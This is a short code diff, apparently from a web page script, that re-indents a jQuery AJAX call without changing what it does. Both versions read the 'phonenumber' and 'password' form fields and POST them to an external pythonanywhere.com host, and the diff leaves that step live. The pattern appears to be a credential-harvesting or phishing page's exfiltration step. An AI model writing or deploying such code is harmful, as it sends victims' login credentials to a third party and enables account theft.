@@ -235,22 +235,20 @@
 
 
 
-$.ajax({
-            
-
-    url: 'https://erikadavis1.pythonanywhere.com ',
-    type: 'POST',
-    contentType: 'application/json',
-    data: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
-    success: function(response) {
-        console.log('Success:', response);
-        return 200
-    },
-    error: function(xhr, status, error) {
-        console.error('Error:', error);
-        return 404
-    }
-});
+    $.ajax({
+        url: 'https://erikadavis1.pythonanywhere.com ',
+        type: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
+        success: function(response) {
+            console.log('Success:', response);
+            return 200
+        },
+        error: function(xhr, status, error) {
+            console.error('Error:', error);
+            return 404
+        }
+    });
 
 
         // var xhr = new XMLHttpRequest();
